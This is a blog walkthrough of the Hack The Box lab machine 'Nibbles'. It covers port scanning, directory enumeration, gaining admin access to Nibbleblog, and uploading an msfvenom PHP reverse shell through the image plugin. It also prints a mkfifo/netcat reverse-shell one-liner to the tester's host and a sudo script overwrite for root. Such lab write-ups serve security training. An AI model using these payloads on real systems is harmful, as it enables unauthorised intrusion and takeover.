---
title: HTB Nibbles
permalink: /htb/nibbles
tags: ["htb"]
---

## nmap

```
# Nmap 7.92 scan initiated Fri Nov 19 11:15:37 2021 as: nmap -p- -sCV -oN nibbles.nmap 10.10.10.75
Nmap scan report for 10.10.10.75
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 19 11:16:14 2021 -- 1 IP address (1 host up) scanned in 36.98 seconds
```

## gobuster

There was nothing on the homepage, but I always quickly check the page source for any comments or interesting notes

### Checking Page Source

```html
<b>Hello world!</b>

...

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

We see that there is a directory called `/nibbleblog` commented out.

## /nibbleblog

`/nibbleblog` looks like a WordPress website, so let's run WPScan. I also ran another `gobuster` scan in the background to save time.

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


Scan Aborted: The remote website is up, but does not seem to be running WordPress.
```

The WPScan results said nibbleblog was not a WordPress site, so I took a deeper look into the gobuster scan results.

```
┌──(tyco㉿4YE)-[~/htb/nibbles]
└─$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,txt,sh -o nibbleblog

/index.php            (Status: 200) [Size: 2987]
/sitemap.php          (Status: 200) [Size: 402] 
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/] 
/feed.php             (Status: 200) [Size: 302]                                             
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]  
/admin.php            (Status: 200) [Size: 1401]                                            
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]                                              
/update.php           (Status: 200) [Size: 1622]                                            
/README               (Status: 200) [Size: 4628]                                            
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/LICENSE.txt          (Status: 200) [Size: 35148]                                             
/COPYRIGHT.txt        (Status: 200) [Size: 1272]
```

I realized after going to `/admin.php`, that `nibbleblog` was on the login page, so I searched it up. I never heard of it, and if it was not a WordPress site, the blog had to be another blogging website. I found out that Nibbleblog is actually a service used to create blogs, ran on PHP.

I went through the directories found in the `gobuster` scan, and `/install.php` redirects to `/update.php`, since the blog is already installed.

```
DB updated: ./content/private/config.xml
DB updated: ./content/private/comments.xml
Categories updated...

Nibbleblog 4.0.3 "Coffee" ©2009 - 2014 | Developed by Diego Najar
```

A version number! A quick search for vulnerabilities shows a [possible](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) RCE exploit. This vulnerability exploits an image plugin where you can upload pictures. This plugin does not check the file extension of what is uploaded, so an attacker can upload a shell. This exploit requires credentials to log into the admin panel to activate the plugin though, so let's find a way to do that. This seems like the way to gain initial access to `nibbles`, but there is not any default credentials. The installation requires a username and password to be provided.

There is also a `README` file that provides some information on nibbleblog

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

===== System Requirements =====
* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory content writable by Apache/PHP

===== Installation guide =====
1- Download the last version from http://nibbleblog.com
2- Unzip the downloaded file
3- Upload all files to your hosting or local server via FTP, Shell, Cpanel, others.
4- With your browser, go to the URL of your web. Example: www.domain-name.com
5- Complete the form
6- Done! you have installed Nibbleblog
```

I tried brute forcing the password using Burp's Intruder, but quickly realized that I was reverse-whitelisted.

```
Nibbleblog security error - Blacklist protection
```

Since my IP was blocked after 5 tries, I figured it was not supposed to be brute forced. I spent a long time trying to figure out what the password was supposed to be, and went through the entire blog directory to see if there were any files that hinted at the password. I eventually found out the password was `nibbles` after watching Ippsec's video because I was stuck on this part. I did not think to try `admin:nibbles` on the login page. Not the biggest fan of this part of Nibbles. It felt impossible for me to figure out without watching a video and looking at a few blogs to see what was the intended way to figure out the password.

![](https://github.com/rsecke/rsecke.github.io/blob/main/images/htb/nibbles/nibbleblog%20dashboard.png)

## Exploiting the Image Plugin

Once inside the nibbleblog dashboard, I navigated to the plugin page by clicking the `Plugin` button near the top left.

![](https://github.com/rsecke/rsecke.github.io/blob/main/images/htb/nibbles/nibbleblog%20plugin%20page.png)

Navigate to the `My image` plugin and click `Configure` on the bottom of the plugin.

![](https://github.com/rsecke/rsecke.github.io/blob/main/images/htb/nibbles/nibbleblog%20image%20plugin.png)

The exploit was very easy to exploit. Create a PHP reverse shell payload and upload it to this plugin. I used `msfvenom` to create the payload.

```
┌──(tyco㉿4YE)-[~/htb/nibbles/scans]
└─$ msfvenom -p php/reverse_php LHOST=10.10.14.15 LPORT=4444 -f raw > shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3052 bytes
```

![](https://github.com/rsecke/rsecke.github.io/blob/main/images/htb/nibbles/uploading%20php%20shell.png)

Click `Save Changes` at the bottom to upload the payload. There will be errors at the top right corner when it is uploaded successfully. Do not worry about it. Set up a netcat listener on Kali.

![](https://github.com/rsecke/rsecke.github.io/blob/main/images/htb/nibbles/error%20during%20upload.png)

Navigate to `http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image` to get the payload to create a reverse shell. I kept getting disconnected from my reverse shell, so I created *another* payload within my reverse shell.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4445 >/tmp/f
```

This payload only works if netcat is installed, so run `which netcat` to confirm if the binary is on the system.

On my new shell, I made it fully functional to make it interactive. First, I checked if there was Python

```
ls /usr/bin | grep python                                  
dh_python3             
python3     
python3.5                                                                                                             
python3.5m                                                 
python3m
```

I saw Python 3, so I ran `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn a Python shell. Background the reverse shell by clicking `CTRL + Z`, and run the following commands:

```
┌──(tyco㉿4YE)-[~/htb/nibbles]                                                                                        
└─$ stty raw -echo; fg
[1]  + continued  nc -nvlp 4445

<ml/nibbleblog/content/private/plugins/my_image$ reset
reset: unknown terminal type unknown            
Terminal type? screen-256color
```

A fully functional shell! Now we can run `sudo -l` to see if this user can run anything.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We see that the user `nibbler` can run a script as root without a password. Let's take a look.

```
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler

nibbler@Nibbles:/home/nibbler$ ls -la
total 24
drwxr-xr-x 4 nibbler nibbler 4096 Nov 22 20:19 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip 
-r-------- 1 nibbler nibbler   33 Nov 22 19:55 user.txt
```

A zip file! Let's unzip it to see the contents inside.

```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

Archive:  personal.zip                                                                                                
   creating: personal/                                     
   creating: personal/stuff/    
  inflating: personal/stuff/monitor.sh
```

The script inside the zip file is the one we can run as root! Let's take a closer look at the bash script.

```
nibbler@Nibbles:/home/nibbler$ ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

The file is world readable and writable, which means I can edit this script to do anything. The easiest way I thought of to escalate privileges was to modify the script to spawn a bash shell, and run it as root to get a root shell. I copied the script to the user `nibbler`'s home directory just in case anything bad happened.

```
nibbler@Nibbles:/home/nibbler$ cp monitor.sh ~/

nibbler@Nibbles:/home/nibbler$ echo bash > monitor.sh

nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh

root@Nibbles:/home/nibbler/personal/stuff#
```

